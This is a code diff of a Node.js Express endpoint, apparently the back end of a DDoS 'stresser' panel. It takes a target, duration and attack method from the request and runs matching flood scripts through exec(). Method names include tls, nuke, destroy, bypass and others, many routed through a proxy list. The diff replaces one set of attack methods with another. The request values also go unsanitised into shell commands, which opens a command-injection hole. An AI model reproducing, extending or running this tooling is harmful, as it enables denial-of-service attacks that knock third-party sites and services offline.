@@ -25,30 +25,30 @@ app.get('/permen', (req, res) => {
   // Eksekusi sesuai methods
   if (methods === 'ninja') {
     console.log('received');
-    exec(`node ./lib/cache/StarsXNinja.js ${target} ${time}`);
-  } else if (methods === 'mix') {
+    exec(`node ./methods/ninja ${target} ${time}`);
+  } else if (methods === 'panel') {
     console.log('received');
-    exec(`node ./lib/cache/StarsXMix.js ${target} ${time} 50 4 proxy.txt`);
-  } else if (methods === 'strike') {
-    exec(`node methods/strike.js GET ${target} ${time} 4 90 proxy.txt --full --legit`);
-  } else if (methods === 'tls') {
-    exec(`node methods/tls.js ${target} ${time} 50 4`);
-  } else if (methods === 'flood') {
-    exec(`node methods/flood.js ${target} ${time}`);
-  } else if (methods === 'spike') {
-    exec(`node methods/spike.js ${target} 4 ${time}`);
-  } else if (methods === 'raw') {
-    exec(`node methods/raw.js ${target} ${time}`);
+    exec(`node ./methods/panel.js ${target} ${time}`);
+  } else if (methods === 'pluto') {
+    exec(`node methods/Pluto.js ${target} ${time} 50 4 proxy.txt`);
+  } else if (methods === 'poseidon') {
+    exec(`node methods/Poseidon.js ${target} ${time} 4 proxy.txt autorate`);
+  } else if (methods === 'nuke') {
+    exec(`node methods/Nuke.js ${target} ${time} 50 4 proxy.txt`);
+  } else if (methods === 'pidoras') {
+    exec(`node methods/PIDORAS.js ${target} ${time} 50 4 proxy.txt`);
+  } else if (methods === 'glory') {
+    exec(`node methods/Glory.js ${target} ${time} 50 4 proxy.txt`);
   } else if (methods === 'gojo') {
     exec(`node methods/gojov5.js ${target} ${time} 50 4 proxy.txt`);
-  } else if (methods === 'tlskill') {
-    exec(`node methods/TLS-KILL.js ${target} ${time} 50 4 proxy.txt`);
-  } else if (methods === 'tlsop') {
-    exec(`node methods/tlsop.js ${target} ${time} 50 4 proxy.txt`);
-  } else if (methods === 'storm') {
-    exec(`node methods/storm.js ${target} ${time} 50 4 proxy.txt`);
-  } else if (methods === 'destroy') {
-    exec(`node methods/DESTROY.js ${target} ${time} 50 4 proxy.txt`);
+  } else if (methods === 'flood') {
+    exec(`node methods/hybrid.js ${target} ${time} 4 50 proxy.txt`);
+  } else if (methods === 'http-raw') {
+    exec(`node methods/HTTP-RAW.js ${target} ${time}`);
+  } else if (methods === 'raw') {
+    exec(`node methods/raw.js ${target} ${time}`);
+  } else if (methods === 'pepek') {
+    exec(`node methods/pepek.js ${target} ${time}`);
   } else if (methods === 'thunder') {
     exec(`node methods/thunder.js ${target} ${time} 50 4 proxy.txt`);
   } else if (methods === 'bypass') {
